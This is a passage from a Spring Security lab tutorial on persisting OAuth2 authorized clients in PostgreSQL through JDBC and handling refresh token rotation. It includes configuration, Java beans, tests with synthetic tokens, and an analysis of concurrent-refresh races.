# 34.8. Persisting Authorized Clients and Handling Refresh Token Rotation

## 1. What Problem Does This Lab Solve?

A **Spring Security OAuth 2.0 OIDC Client** application lets users sign into an OpenID Provider (OP), obtain an Access Token, and optionally receive a Refresh Token to continue calling APIs without signing in again every time the Access Token expires. When developing locally on a single machine, storing authorized clients in memory or an HTTP session can create the illusion that everything works reliably.

In production, however, at least four scenarios expose weaknesses:

1. **Application restarts:** Access Tokens, Refresh Tokens, or granted connections vanish if stored only in an in-memory store.
2. **Multiple instances:** Pod A persists a new token while Pod B still reads an old token if there is no shared data store.
3. **Refresh Token rotation:** The Authorization Server issues a new Refresh Token on every refresh while potentially invalidating the old Refresh Token. Incorrect overwrites or concurrent refreshes can cause subsequent requests to fail with `invalid_grant`.
4. **Failure handler deleting the wrong record:** A request using a stale Refresh Token receives `invalid_grant` and deletes the newly saved authorized client written by another request.

In this lab, you will build a model combining a **persistent authorized-client store**, **`OAuth2AuthorizedClientManager`**, a **fake/test OIDC provider with Refresh Token rotation**, **concurrency testing**, and an **upgrade path to multi-node-safe persistence**.

### Expected Outcomes

After completing this lab, you will be able to:

- Distinguish `OAuth2AuthorizedClient`, `OAuth2AuthorizedClientService`, `OAuth2AuthorizedClientRepository`, and `OAuth2AuthorizedClientManager`.
- Persist authorized clients with JDBC rather than relying solely on memory or sessions.
- Verify that authorized clients reload cleanly after creating a new service instance or restarting the app.
- Trigger a refresh when the Access Token is about to expire and persist the new Access Token/Refresh Token.
- Understand OP behavior when a Refresh Token is **rotated** and when a stale Refresh Token is reused.
- Prevent races using **single-flight/distributed coordination** combined with **versioned compare-and-swap**.
- Distinguish `invalid_grant` from Token Endpoint timeouts/503s and Resource Server 401/403s.
- Keep plaintext tokens out of logs, metrics, CI artifacts, and test reports.
- Design tests for successful refresh, rotation races, database failures, account/provider isolation, and rollback scenarios.

> **Version note:** Java examples target Spring Boot 3.x + Spring Security 6.x, Java 17+, Servlet stack, and JDBC. Package names, beans, schemas, or APIs may differ in newer Spring Security branches. Verify against your project's dependency BOM and Javadoc before copying. The advanced distributed-coordination example is an architectural blueprint to integrate, not a library enabled by a single property.

## 2. Distinguishing Frequently Confused Concepts

| Component | Role | Contains Tokens? |
| --- | --- | --- |
| `ClientRegistration` | OAuth2 client metadata: `registrationId`, `clientId`, grant type, provider endpoints, scopes | Holds no user tokens, though it may hold a client secret |
| `OAuth2AuthorizedClient` | An authorization result tying together client registration, principal name, Access Token, and optional Refresh Token | **Yes** |
| `OAuth2AuthorizedClientService` | Saves/loads/removes authorized clients by registration and principal | Persists tokens via its implementation |
| `OAuth2AuthorizedClientRepository` | Saves/loads/removes authorized clients in web request/authentication context | May use session or delegate to a service |
| `OAuth2AuthorizedClientManager` | Looks up authorized clients, obtains/refreshes grants when needed, runs success/failure handlers | Reads and updates tokens via repository/service |
| `HttpSession` / `WebSession` | User's HTTP session at the RP | May hold authentication/state; not synonymous with authorized client |
| `OidcUser` | OIDC-authenticated principal containing ID Token and claims | Not a Refresh Token store |
| Resource Server | API validating Access Tokens and permissions | Does not manage RP HTTP sessions |

### 2.1. How Is an Authorized Client Identified?

A standard implementation like `OAuth2AuthorizedClientService` normally saves and loads by:

~~~text
(clientRegistrationId, principalName)
    -> OAuth2AuthorizedClient
         registration
         principal
         access token
         optional refresh token
~~~

Example:

~~~text
(company, alice-sub) -> Access A1 + Refresh R1
(company, bob-sub)   -> Access B1 + Refresh S1
(partner, alice-sub) -> Access P1 + Refresh T1
~~~

**Identity warning:** `sub` is meaningful only within its issuer. When supporting multiple providers or tenants, internal identity mapping must use the verified issuer + subject, never email or raw `sub` alone. Keeping the same `registrationId` while changing its issuer in the same store can mix up tokens and identity keys.

### 2.2. Refresh Tokens Are Not ID Tokens

- **ID Token:** authenticates the user at RP OIDC Login; RP checks signature, issuer, audience, nonce, and timestamps per flow.
- **Access Token:** sent to Resource Servers/UserInfo when scopes and audience match.
- **Refresh Token:** sent to the **Token Endpoint** to obtain new tokens; never used as a Bearer token to call APIs.
- **Client Secret / private key:** RP proves OAuth2 client identity at the Token Endpoint when acting as a confidential client.

Never log any value from these four groups in debug logs or screenshots.

## 3. Lab Architecture

~~~mermaid
flowchart LR
    U["Browser / test user"] --> RP["Spring Boot OAuth2/OIDC Client"]
    RP --> F["Spring Security Filter Chain"]
    F --> M["OAuth2AuthorizedClientManager"]
    M --> S["OAuth2AuthorizedClientService"]
    S --> DB[("PostgreSQL token store")]
    M --> OP["Test OpenID Provider / Token Endpoint"]
    RP --> API["Test Resource Server"]
    OP --> RP
    RP --> U
~~~

In the advanced section:

~~~mermaid
flowchart TB
    A["Pod A"] --> C["Rotation Coordinator"]
    B["Pod B"] --> C
    C --> L["Per-connection distributed lease + fencing"]
    L --> DB[("Versioned encrypted token store")]
    C --> OP["OP Token Endpoint"]
    OP --> C
    C --> CAS["Compare-and-swap save / conditional cleanup"]
    CAS --> DB
~~~

### 3.1. Components Needed

| Tool | Role |
| --- | --- |
| Java 17+ | Runs Spring Boot 3.x / Security 6.x |
| Gradle or Maven | Dependency management |
| Spring Boot Web + OAuth2 Client + Security | OIDC login and authorized-client management |
| Spring JDBC | Persistent `JdbcOAuth2AuthorizedClientService` |
| PostgreSQL | Durable token store shared across instances |
| Test OIDC Provider | Issues authorization codes, Access Tokens, and optional Refresh Tokens |
| Mock HTTP Server / Resource Server | Simulates API 200/401/403 responses |
| JUnit 5 + Spring Security Test | Unit/integration tests |
| Testcontainers | Real PostgreSQL in integration tests |

Never use real production user credentials in the lab. Use dedicated test users, test client registrations, and synthetic tokens.

## 4. Defining Acceptance Criteria Before Writing Code

| ID | Criterion | Evidence |
| --- | --- | --- |
| AC-01 | User logs in; authorized client is saved | Service/store loads the record |
| AC-02 | New service instance reads the same record | Integration test against shared DB |
| AC-03 | Pod replacement or restart does not lose authorized client | Shared persistence test |
| AC-04 | Unexpired Access Token does not refresh unnecessarily | Token Endpoint request counter |
| AC-05 | Expiring Access Token triggers refresh | Response returns A2 replacing A1 |
| AC-06 | Provider issues Refresh R2; store replaces R1 with R2 | Reloaded record check |
| AC-07 | Provider omits new Refresh Token | Retains existing Refresh Token when permitted by contract |
| AC-08 | Two concurrent requests do not reuse R1 | Single-flight coordination |
| AC-09 | Stale `invalid_grant` does not delete R2 | Conditional failure cleanup |
| AC-10 | HTTP 503 does not wipe out grants | Store unchanged; bounded retry |
| AC-11 | Alice's token cannot be loaded by Bob or another registration | Isolation tests |
| AC-12 | Tokens never appear in logs, metrics, or API responses | Redaction checks |

We will implement the **JDBC baseline first**, then design and test the upgrade for rotation safety. `JdbcOAuth2AuthorizedClientService` is a solid step toward durability; **on its own, it guarantees neither single-flight refresh nor application-layer encryption**.

## 5. Configuring the Test OpenID Provider

Create a confidential OIDC client in your **test provider**, for example:

~~~text
Provider issuer:
  https://id.example.test/realms/lab

Registration ID:
  company

Client ID:
  portal-lab

Grant types:
  authorization_code
  refresh_token (when supported by provider)

Redirect URI:
  http://localhost:8080/login/oauth2/code/company

Scopes:
  openid profile email
  optional offline_access (if required by OP)
~~~

Configure the provider to issue Refresh Tokens and support **Refresh Token rotation/reuse detection** so you can simulate failures. Settings like "rotate refresh token", "refresh token max reuse", "consent", or "offline access" **depend on each OP**; there is no universal Spring Boot property that turns on rotation on the Authorization Server side.

### 5.1. Give Access Tokens a Short Lifetime

In the **test environment**, set the Access Token TTL to a few dozen seconds so refreshes can be observed quickly. Never edit a JWT's `exp` field manually; the RP and OP must agree on the tokens actually issued by the OP.

### 5.2. Two Provider Modes to Test

**Mode 1 — Non-rotating:**

~~~text
Request:
  grant_type=refresh_token
  refresh_token=R1

Response:
  access_token=A2
  refresh_token omitted OR refresh_token=R1 (per contract)
~~~

**Mode 2 — Rotating:**

~~~text
Request:
  grant_type=refresh_token
  refresh_token=R1

Response:
  access_token=A2
  refresh_token=R2

Subsequent R1 reuse:
  invalid_grant
  possibly refresh-token family revocation by OP policy
~~~

These two modes have different semantics. Do not assume providers always rotate, and do not assume every `invalid_grant` means a token was stolen.

## 6. Dependencies for the JDBC Baseline

Gradle example for Spring Boot 3.x:

~~~groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'
    implementation 'org.springframework.boot:spring-boot-starter-jdbc'
    implementation 'org.springframework.boot:spring-boot-starter-actuator'

    runtimeOnly 'org.postgresql:postgresql'

    testImplementation 'org.springframework.boot:spring-boot-starter-test'
    testImplementation 'org.springframework.security:spring-security-test'
    testImplementation 'org.testcontainers:junit-jupiter'
    testImplementation 'org.testcontainers:postgresql'
}
~~~

These dependencies are a **sample**; use the BOM version compatible with your project's Java and Spring Boot versions. If using WebFlux instead of Servlet, dependencies and security DSLs differ; the Reactive counterpart is covered near the end.

### 6.1. Environment Configuration

~~~yaml
spring:
  datasource:
    url: ${DB_JDBC_URL}
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}

  security:
    oauth2:
      client:
        registration:
          company:
            provider: company-oidc
            client-id: ${OIDC_CLIENT_ID}
            client-secret: ${OIDC_CLIENT_SECRET}
            client-authentication-method: client_secret_basic
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            scope: [openid, profile, email, offline_access]
        provider:
          company-oidc:
            issuer-uri: https://id.example.test/realms/lab

logging:
  level:
    org.springframework.security: INFO
~~~

`offline_access` here is only a **scope request**; whether the OP actually issues a Refresh Token depends on client registration, consent, policies, and the provider contract. Never commit real database passwords or client secrets to Git.

### 6.2. Prerequisites for Receiving a Refresh Token

Spring Security Client **cannot invent** a Refresh Token if the OP does not issue one. When an authorized client lacks a Refresh Token:

- For Authorization Code / OIDC Login, the user may need a new authorization request/consent per OP policy.
- For Client Credentials, there is normally no user Refresh Token; when the Access Token expires, the manager requests a new Access Token via `client_credentials`.
- Never fabricate a dummy Refresh Token or store a client secret in the Refresh Token field.

## 7. Preparing the JDBC Persistent Store Schema

Spring Security ships a reference SQL schema for `JdbcOAuth2AuthorizedClientService`, typically found on the classpath at:

~~~text
org/springframework/security/oauth2/client/oauth2-client-schema.sql
~~~

When using PostgreSQL, convert the reference schema **for your exact framework version** into a migration managed by Flyway, Liquibase, or an equivalent tool; verify column types, names, and JDBC driver behavior.

**PostgreSQL-oriented** example (verify against the schema of your exact Spring Security version):

~~~sql
CREATE TABLE oauth2_authorized_client (
    client_registration_id VARCHAR(100) NOT NULL,
    principal_name VARCHAR(200) NOT NULL,
    access_token_type VARCHAR(100) NOT NULL,
    access_token_value BYTEA NOT NULL,
    access_token_issued_at TIMESTAMP NOT NULL,
    access_token_expires_at TIMESTAMP NOT NULL,
    access_token_scopes VARCHAR(1000),
    refresh_token_value BYTEA,
    refresh_token_issued_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
    PRIMARY KEY (client_registration_id, principal_name)
);
~~~

**Do not arbitrarily rename or drop columns while using the default JDBC implementation**: Spring Security's SQL readers and writers expect exact schema columns. On PostgreSQL, confirm `BYTEA` and timestamp types match your driver and framework version's mappers. Never copy a MySQL or H2 schema blindly.

### 7.1. Why Does the Primary Key Matter?

~~~text
PRIMARY KEY (client_registration_id, principal_name)
~~~

It prevents two rows with the same key in the default JDBC service layer. However, **a primary key does not stop two requests from reading the same stale Refresh Token and calling the Token Endpoint concurrently**.

### 7.2. Never Use `ddl-auto=create-drop` for a Token Store

A table holding OAuth2 credentials must survive deployments. Never configure your system to drop and recreate the table on every restart. Use versioned migrations, backups, and explicit retention policies.

### 7.3. Protecting the Database

This database stores **highly sensitive tokens**. At minimum, enforce:

- Least-privilege SQL grants for the workload; restrict direct database access.
- Encryption at rest and encrypted backups.
- TLS to the database, credential rotation, and a secret manager.
- Never use a database superuser for the application.
- Never run queries dumping `access_token_value`/`refresh_token_value` into support tickets.
- For high security requirements, add **application-level envelope encryption** or equivalent; the default JDBC implementation does not provide application-layer encryption.

## 8. The `JdbcOAuth2AuthorizedClientService` Bean

A Spring Security Servlet configuration:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.jdbc.core.JdbcOperations;
import org.springframework.security.oauth2.client.JdbcOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.AuthenticatedPrincipalOAuth2AuthorizedClientRepository;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class AuthorizedClientPersistenceConfig {

    @Bean
    OAuth2AuthorizedClientService authorizedClientService(
            JdbcOperations jdbc,
            ClientRegistrationRepository clientRegistrations) {

        return new JdbcOAuth2AuthorizedClientService(
            jdbc, clientRegistrations);
    }

    @Bean
    OAuth2AuthorizedClientRepository authorizedClientRepository(
            OAuth2AuthorizedClientService service) {

        return new AuthenticatedPrincipalOAuth2AuthorizedClientRepository(
            service);
    }
}
~~~

**Meaning:**

1. `JdbcOAuth2AuthorizedClientService` persists tokens in the database.
2. `AuthenticatedPrincipalOAuth2AuthorizedClientRepository` stores the authenticated principal's authorized client in the persistent service; anonymous web contexts follow separate behavior.
3. `oauth2Login()` and managers use the injected repository/service from the Spring context rather than falling back to an `InMemoryOAuth2AuthorizedClientService`.

### 8.1. Do Not Accidentally Register Two Competing Beans

If the application already defines a custom repository or service, adding a new bean without wiring it into `SecurityFilterChain`, `WebClient`, or the manager leaves tokens writing to the old store. Verify dependency injection, qualifiers, and live request paths.

### 8.2. Default JDBC Does Not Encrypt Tokens at the Application Layer

Token values are stored as raw bytes by the service's mapper. Database encryption at rest and TLS are essential, yet if your threat model protects against DB operators or backup access reading tokens, you need a **custom encrypted implementation**. Never claim `JdbcOAuth2AuthorizedClientService` provides full token encryption simply because the column is `BYTEA`.

## 9. Configuring `OAuth2AuthorizedClientManager` for Servlet Requests

The manager loads the existing authorized client, decides whether a refresh is needed, and persists results through the repository:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProvider;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class AuthorizedClientManagerConfig {

    @Bean
    OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository repository) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .authorizationCode()
                .refreshToken()
                .clientCredentials()
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                registrations, repository);
        manager.setAuthorizedClientProvider(provider);

        return manager;
    }
}
~~~

This is a **Servlet request-oriented manager**. Enabling `authorizationCode()` does not let the manager open a browser while running a background job. The OIDC Login browser flow must be configured and handled via Spring Security filters.

### 9.1. Do You Need Custom Success/Failure Handlers Immediately?

For the baseline, keep default success/failure behavior once you understand your version. Spring Security managers save authorized clients on successful authorization and remove them when refresh fails with errors such as `invalid_grant`.

**Production warning:** with multiple nodes and Refresh Token rotation, **unconditional removal** in a failure handler can hit races. The advanced section replaces update/remove logic with versioned operations and refresh coordination. Never simply wrap the JDBC service in a local `synchronized` block and assume a cluster is safe.

### 9.2. Do Not Use a Default Authorized Client for All URLs

A `RestClient` or `WebClient` may attach Access Tokens to outbound URLs. Attach tokens only to **trusted Resource Servers** with the right audience and scopes; never let users pass arbitrary URLs that automatically receive OAuth2 tokens, preventing SSRF and token exfiltration.

## 10. `SecurityFilterChain` for OIDC Login

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class LoginSecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http)
            throws Exception {

        return http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error").permitAll()
                .anyRequest().authenticated())
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login"))
            .build();
    }
}
~~~

This is a standalone skeleton requiring the application to implement the custom `/login` page. Default login initiation URL:

~~~text
GET /oauth2/authorization/company
~~~

Typical callback:

~~~text
GET /login/oauth2/code/company?code=...&state=...
~~~

Never log raw `code` or `state`. Spring Security handles authorization request/session correlation, PKCE, and OIDC ID Token validation; never replace those steps with custom code just to simplify debugging.

### 10.1. When an Application Has Multiple Security Chains

When you have an API chain, a web/login chain, and an actuator chain, configure matchers and ordering explicitly. If a chain matches `/login/oauth2/code/*` incorrectly, the callback will not finish and the authorized client will never be persisted.

## 11. Journey of Persisting the Authorized Client After Login

~~~mermaid
sequenceDiagram
    autonumber
    actor Browser
    participant RP as Spring Security OAuth2 Login
    participant OP as OpenID Provider
    participant Repo as AuthorizedClientRepository
    participant JDBC as JDBC AuthorizedClientService
    participant DB as PostgreSQL
    Browser->>RP: Start /oauth2/authorization/company
    RP-->>Browser: Redirect to OP with state/PKCE
    Browser->>OP: Authenticate, grant consent
    OP-->>Browser: code + state callback
    Browser->>RP: Callback
    RP->>OP: Exchange code for tokens
    OP-->>RP: ID Token, A1, optional R1
    RP->>RP: Validate ID Token and create Authentication
    RP->>Repo: saveAuthorizedClient(...)
    Repo->>JDBC: saveAuthorizedClient(...)
    JDBC->>DB: INSERT/UPDATE authorized client
    RP-->>Browser: Session cookie + success redirect
~~~

### 11.1. Two Independent Persistence Layers

- **HTTP session / `SecurityContext`:** maintains the user's authenticated state at the RP.
- **Authorized client store:** persists Access/Refresh Tokens tied to registration and principal.

One can survive while the other disappears. For instance, a browser session may expire while the service still retains the authorized client record for an approved background workflow—this requires explicit policies on user consent and revocation, rather than assuming any token remaining in the DB authorizes arbitrary jobs.

### 11.2. Observing Results Safely

Never run `SELECT *` in support tickets or print token bytes. Example metadata-only query:

~~~sql
SELECT
    client_registration_id,
    access_token_expires_at,
    (refresh_token_value IS NOT NULL) AS refresh_token_present,
    created_at
FROM oauth2_authorized_client
WHERE client_registration_id = 'company';
~~~

Even `principal_name` can be PII or a subject identifier; query it only with proper authorization and legitimate investigative need, or map to non-sensitive aliases in logs and reports.

## 12. Practice A — Verifying Data Survives a Restart

**Step 1:** Start test PostgreSQL and run the migration for `oauth2_authorized_client`.

**Step 2:** Start the Spring Boot app with registration `company` connected to the real database.

**Step 3:** Sign in with a **test user** via the OP. Confirm the API/callback succeeds.

**Step 4:** Inspect metadata in the database (`refresh_token_present`, `access_token_expires_at`) or restricted diagnostics APIs; **never print token values**.

**Step 5:** Restart the application **without wiping the database**.

**Step 6:** Create a new service instance or call `loadAuthorizedClient("company", principalName)` with the exact identity key and verify the record still exists.

**Step 7:** Distinguish the outcomes:

~~~text
Authorized client persisted = true
Browser HTTP session persisted = depends on session store
User may need login again = possible even when token record remains
~~~

With a local in-memory HTTP session, a restart still clears the browser login; this **does not mean JDBC authorized-client persistence failed**.

### 12.1. Expected Result

~~~text
Before restart:
  (company, test-user) -> authorized client exists

After restart:
  JDBC service reload -> authorized client exists
  access token expiry metadata unchanged
  refresh token presence unchanged
~~~

### 12.2. If the Record Does Not Appear

Check:

- Is the application actually using the `JdbcOAuth2AuthorizedClientService` bean?
- Is `AuthenticatedPrincipalOAuth2AuthorizedClientRepository` wired?
- Did login use the exact `registrationId`?
- Were there database/schema permission, connection, or transaction rollback errors?
- Did the OP actually issue tokens successfully?
- Does the principal used during `save` match the principal used during `load`?
- Is a custom repository or handler still writing to the session or an in-memory store?

## 13. Unit/Integration Tests for the JDBC Service

In tests, construct a `ClientRegistration` with dummy values; no real tokens are needed:

~~~java
import java.time.Instant;
import java.util.Set;

import org.springframework.security.oauth2.client.registration.ClientRegistration;
import org.springframework.security.oauth2.client.registration.InMemoryClientRegistrationRepository;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.JdbcOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.ClientAuthenticationMethod;
import org.springframework.security.oauth2.core.OAuth2AccessToken;
import org.springframework.security.oauth2.core.OAuth2RefreshToken;

ClientRegistration registration = ClientRegistration
    .withRegistrationId("company")
    .clientId("portal-lab")
    .clientSecret("test-only-secret")
    .clientAuthenticationMethod(
        ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
    .authorizationGrantType(
        AuthorizationGrantType.AUTHORIZATION_CODE)
    .redirectUri("{baseUrl}/login/oauth2/code/{registrationId}")
    .authorizationUri("https://id.example.test/authorize")
    .tokenUri("https://id.example.test/token")
    .jwkSetUri("https://id.example.test/jwks")
    .userInfoUri("https://id.example.test/userinfo")
    .userNameAttributeName("sub")
    .scope("openid", "profile", "offline_access")
    .build();

Instant now = Instant.now();

OAuth2AccessToken access = new OAuth2AccessToken(
    OAuth2AccessToken.TokenType.BEARER,
    "access-test-A1",
    now.minusSeconds(5),
    now.plusSeconds(90),
    Set.of("openid", "profile"));

OAuth2RefreshToken refresh =
    new OAuth2RefreshToken("refresh-test-R1", now);

OAuth2AuthorizedClient authorized =
    new OAuth2AuthorizedClient(
        registration, "alice-test-sub", access, refresh);
~~~

This is a **fixture fragment**, not production code. If `ClientRegistration.Builder` in your framework version requires additional fields, supply them per contract.

### 13.1. Testing Save → Load with a Separate Service Instance

~~~java
// Assumes JdbcOperations jdbc points to a test DB
// and the oauth2_authorized_client table is migrated.
var registrations =
    new InMemoryClientRegistrationRepository(registration);

var writer = new JdbcOAuth2AuthorizedClientService(
    jdbc, registrations);
writer.saveAuthorizedClient(authorized);

// New instance -> do not reuse the writer object.
var reader = new JdbcOAuth2AuthorizedClientService(
    jdbc, registrations);
OAuth2AuthorizedClient loaded =
    reader.loadAuthorizedClient("company", "alice-test-sub");

assertNotNull(loaded);
assertEquals("access-test-A1",
    loaded.getAccessToken().getTokenValue());
assertEquals("refresh-test-R1",
    loaded.getRefreshToken().getTokenValue());
~~~

`OAuth2AuthorizedClientService.saveAuthorizedClient` takes **one** `OAuth2AuthorizedClient`; the principal name is already inside the object. Do not confuse it with `OAuth2AuthorizedClientRepository.saveAuthorizedClient(...)`, which also accepts `Authentication` and request/response.

### 13.2. Testing Token Update After Refresh

~~~java
OAuth2AccessToken access2 = new OAuth2AccessToken(
    OAuth2AccessToken.TokenType.BEARER,
    "access-test-A2",
    now.plusSeconds(10),
    now.plusSeconds(310),
    Set.of("openid", "profile"));

OAuth2RefreshToken refresh2 =
    new OAuth2RefreshToken("refresh-test-R2", now.plusSeconds(10));

OAuth2AuthorizedClient rotated =
    new OAuth2AuthorizedClient(
        registration, "alice-test-sub", access2, refresh2);

writer.saveAuthorizedClient(rotated);

OAuth2AuthorizedClient reloaded =
    reader.loadAuthorizedClient("company", "alice-test-sub");

assertEquals("access-test-A2",
    reloaded.getAccessToken().getTokenValue());
assertEquals("refresh-test-R2",
    reloaded.getRefreshToken().getTokenValue());
~~~

These tokens are **synthetic test values**, not real credentials. A complete test initializes the DB/schema, runs setup/cleanup, verifies isolation across principals/registrations, and never logs tokens.

### 13.3. Testing Removal

~~~java
writer.removeAuthorizedClient("company", "alice-test-sub");

assertNull(reader.loadAuthorizedClient(
    "company", "alice-test-sub"));
~~~

Removal deletes the local record; it **does not** call the OP's revocation endpoint. Testing remote revocation is a separate case.

## 14. OIDC Login and Background Jobs Use Different Managers

In Servlet requests, `DefaultOAuth2AuthorizedClientManager` uses `OAuth2AuthorizedClientRepository`. Scheduled jobs have no `HttpServletRequest`/`HttpServletResponse`, so they need a manager paired with `OAuth2AuthorizedClientService`.

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.AuthorizedClientServiceOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;

@Configuration
public class BackgroundOAuthClientConfig {

    @Bean("backgroundAuthorizedClientManager")
    OAuth2AuthorizedClientManager backgroundAuthorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientService service) {

        AuthorizedClientServiceOAuth2AuthorizedClientManager manager =
            new AuthorizedClientServiceOAuth2AuthorizedClientManager(
                registrations, service);

        manager.setAuthorizedClientProvider(
            OAuth2AuthorizedClientProviderBuilder.builder()
                .refreshToken()
                .clientCredentials()
                .build());

        return manager;
    }
}
~~~

### 14.1. Client Credentials vs. Delegated User Tokens

With a Client Credentials registration:

~~~java
OAuth2AuthorizeRequest request =
    OAuth2AuthorizeRequest.withClientRegistrationId("reports-machine")
        .principal("reports-scheduler")
        .build();

OAuth2AuthorizedClient client =
    backgroundAuthorizedClientManager.authorize(request);
~~~

**This is an illustrative fragment**: define the manager bean, imports, and `reports-machine` registration with grant type `client_credentials`. Client Credentials normally **do not issue Refresh Tokens**; when the Access Token expires, the manager obtains a new token using client credentials. Never treat a machine token as a delegated user token.

### 14.2. Delegated User Connections in the Background

A job using a user-granted Refresh Token requires:

- The connection belongs to the verified authenticated user/internal account.
- Consent/policy permits background access.
- Principal name matches the exact key used during login/save.
- Token storage, rotation, and revocation are tightly controlled.
- Never take one browser user's Access Token and reuse it in another tenant's job.

If the principal key is changed from `sub` to email or account ID without migrating the store, the manager will fail to locate existing authorized clients.

## 15. Practice B — Observing Automatic Access Token Refresh

### 15.1. Preconditions

- Test OP has issued Access Token `A1` and Refresh Token `R1`.
- Authorized client `(company, alice-test-sub)` is persisted in JDBC.
- Access Token `A1` is expired or within the manager/provider clock skew window.
- Manager has the `refreshToken()` provider configured.

### 15.2. Logical Sequence

~~~mermaid
sequenceDiagram
    autonumber
    participant App as OAuth2AuthorizedClientManager
    participant DB as Persistent Store
    participant OP as Token Endpoint
    App->>DB: load(company, alice)
    DB-->>App: A1 expires soon, R1
    App->>OP: POST grant_type=refresh_token + R1
    OP-->>App: Access A2 + Refresh R2
    App->>DB: save(company, alice, A2, R2)
    DB-->>App: Committed
    App-->>App: Use Access A2 for intended API
~~~

### 15.3. Illustrative HTTP Request (Redacted)

~~~http
POST /realms/lab/protocol/openid-connect/token HTTP/1.1
Host: id.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic REDACTED_CLIENT_AUTH

grant_type=refresh_token&
refresh_token=REDACTED_R1
~~~

Response:

~~~json
{
  "access_token": "REDACTED_A2",
  "token_type": "Bearer",
  "expires_in": 300,
  "refresh_token": "REDACTED_R2",
  "scope": "openid profile"
}
~~~

This is illustrative; depending on the OP, `refresh_token` may be **omitted** from the response. A compliant client keeps the previous refresh token when the OP omits a new one per contract, and **replaces the old token with the new one** when the OP rotates.

### 15.4. After a Successful Refresh

~~~text
Before: Access A1, Refresh R1
After:  Access A2, Refresh R2
~~~

Never print real raw tokens; `A1`/`R1`/`A2`/`R2` are strictly symbolic test labels. Inspect store metadata/versions or compare controlled synthetic token identifiers in tests.

### 15.5. If Refresh Does Not Trigger

Check:

1. Does the authorized client actually contain a Refresh Token?
2. Is the Access Token past expiry/clock skew according to the `Clock`?
3. Does the manager include the `refreshToken()` provider?
4. Do `registrationId` and principal match?
5. Does the client registration have a valid Token Endpoint and auth method?
6. Did the OP revoke or expire the Refresh Token?
7. Did refresh succeed while the success handler failed to persist it?
8. Did a reactive test fail to subscribe/invoke the manager so refresh logic never ran?

## 16. What Is Refresh Token Rotation?

Under Refresh Token rotation, after accepting a valid `R1`:

~~~text
Refresh Request #1:
  Client -> OP: R1
  OP -> Client: Access A2, Refresh R2
  R1 becomes invalid (depending on provider policy)

Refresh Request #2:
  Client -> OP: R2
  OP -> Client: Access A3, Refresh R3
  R2 becomes invalid
~~~

If `R1` appears again, the OP may return `invalid_grant` and even revoke **the entire token family** to stop replay attacks. Exact behavior is provider-specific; never assume every OP revokes the full family.

### 16.1. What Does Rotation Protect Against?

Rotation helps detect reuse of an already-consumed Refresh Token; it does not replace TLS, client authentication, sender-constrained tokens, token encryption, storage access controls, or user consent.

### 16.2. Refresh Token Family

~~~text
Family F
  R1 -> R2 -> R3 -> R4

Current active = R4
Reusing R1/R2 could trigger reuse detection.
~~~

An uncoordinated system where Pod B sends `R1` after Pod A already obtained `R2` can look like a replay attack to the OP even with no attacker present. Thus concurrency is **both a reliability and a security issue**.

### 16.3. When the OP Returns 200 Without `R2`

Do not overwrite `refresh_token=null` and force the user to log in again if the OP contract permits reusing `R1`. The OAuth2 client library must retain the existing refresh token when no new one is returned. Test this case explicitly instead of assuming every 200 response rotates.

## 17. Race Condition: Two Concurrent Refresh Requests

~~~mermaid
sequenceDiagram
    autonumber
    participant A as Pod A / Request A
    participant B as Pod B / Request B
    participant DB as Token Store
    participant OP as Authorization Server
    A->>DB: load (company, alice): A1, R1
    B->>DB: load (company, alice): A1, R1
    A->>OP: refresh R1
    OP-->>A: A2, R2
    A->>DB: save A2, R2
    B->>OP: refresh R1
    OP-->>B: invalid_grant / replay detection
    B->>DB: default failure cleanup (unconditional)
    Note over DB: R2 may be deleted by stale failure
~~~

Three risks:

1. **Duplicate refresh:** OP rejects `R1` when the second request arrives.
2. **Lost update:** an older response/record overwrites a newer record.
3. **Stale failure cleanup:** Request B deletes the valid result just saved by Request A.

